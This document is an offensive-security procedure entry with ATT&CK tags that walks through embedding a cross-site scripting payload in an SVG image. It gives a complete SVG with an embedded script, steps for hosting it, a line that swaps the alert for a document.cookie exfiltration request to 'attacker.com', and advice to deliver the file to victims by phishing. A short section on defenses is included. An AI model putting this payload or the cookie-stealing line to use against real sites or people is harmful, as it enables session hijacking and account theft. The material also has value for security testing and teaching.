---
id: bb8a3378-891c-4d95-892c-dc91373cd132
name: Inject-XSS-via-SVG-File-with-JavaScript-Alert
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.034627+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/XSS in files]]'
  - '[[tags/XSS in SVG]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Inject-XSS-via-SVG-File-with-JavaScript-Alert

## Summary

This procedure demonstrates how to embed a cross-site scripting (XSS) payload within an SVG file using a simple triangle graphic and a JavaScript alert. The payload executes when the SVG is rendered in a web browser, potentially allowing an attacker to steal session cookies, display phishing prompts, or perform other client-side attacks. It targets scenarios where user-uploaded files are not properly sanitized, such as image upload features on websites.

## Description

SVG files support embedded JavaScript through <script> tags, making them a vector for stored or reflected XSS if applications serve or render SVGs without validation. In this technique, a benign-looking SVG triangle is created with points defining its shape, filled in green with a dark green stroke for visual appeal. The malicious script alerts the document's domain upon loading, confirming execution. This can be extended to more harmful actions like keylogging or credential theft. The attack relies on social engineering to get victims to open the file or on vulnerable upload mechanisms that store and display SVGs. Prerequisites include basic knowledge of SVG syntax and JavaScript. Success is verified by the alert popping up in the browser, indicating the payload executed in the victim's context.

## Requirements

1. Access to a web server or file hosting service to serve the SVG file (e.g., Apache, Nginx, or a simple HTTP server like Python's http.server).
2. A modern web browser (e.g., Chrome, Firefox) to test and render the SVG.
3. Knowledge of XSS payloads and SVG structure; no special privileges on the target system are needed beyond tricking the user into opening the file.
4. Optional: A vulnerable application with an unsecured file upload feature that accepts SVG as an image type.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization for file uploads, rejecting or stripping <script> tags and JavaScript from SVG content using libraries like DOMPurify.
- Enforce Content Security Policy (CSP) headers with 'unsafe-inline' disallowed for script-src to block inline JavaScript execution in SVGs.
- Serve SVGs with the Content-Type 'image/svg+xml' but add X-Content-Type-Options: nosniff to prevent MIME-type confusion.
- Regularly update web browsers and server software to patch known SVG parsing vulnerabilities; monitor for anomalous JavaScript execution via browser developer tools or endpoint detection tools.
- Scan uploaded files with antivirus or specialized web scanners that detect embedded scripts in non-executable formats.

## Objectives

1. Create a visually innocuous SVG file containing an embedded XSS payload.
2. Host or deliver the SVG to a victim, triggering JavaScript execution upon rendering in a browser.
3. Demonstrate vulnerability by alerting the document domain, which can be replaced with data exfiltration or session hijacking.

## Instructions

### Step 1: Create the Malicious SVG File

**Context**: Construct the SVG using XML structure to define a triangle polygon and embed the JavaScript payload. This step ensures the file appears as a legitimate graphic while hiding the script.

Use a text editor to create the SVG file, incorporating the provided code snippet.

**Code** ([[codes/SVG-XSS-Triangle-Alert]]):

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

> The polygon element draws the triangle with specified points, green fill, and dark green stroke. The script executes on load, alerting the current domain to confirm XSS. Save this as 'triangle.svg'.

### Step 2: Host the SVG File

**Context**: Serve the file via HTTP to simulate delivery through a vulnerable upload or direct link. This allows testing in a browser context where the script can access document properties.

Start a simple web server in the directory containing the SVG:

- On Linux/macOS with Python 3: `python3 -m http.server 8000`
- On Windows with Python: `python -m http.server 8000`

Access the file at `http://localhost:8000/triangle.svg` in a browser.

> If testing against a real application, upload the SVG via a file upload form and view the hosted version.

### Step 3: Verify Payload Execution

**Context**: Open the SVG in a browser to confirm the alert triggers, validating the XSS vulnerability.

Navigate to the hosted SVG URL. The triangle should render, and an alert box should immediately pop up displaying the domain (e.g., 'localhost').

> If no alert appears, check browser console for errors (e.g., CSP blocking) or ensure the file is served with correct MIME type. Replace the alert with `document.location='http://attacker.com/steal?cookie='+document.cookie;` for real exfiltration testing.

### Step 4: Test in Vulnerable Context

**Context**: Simulate delivery to a victim, such as embedding in an email or uploading to a site that renders SVGs inline.

Send the SVG link via phishing or upload to a test application. Observe execution in the target's session.

> Success is indicated by the alert in the victim's browser, confirming context inheritance and potential for further exploitation.
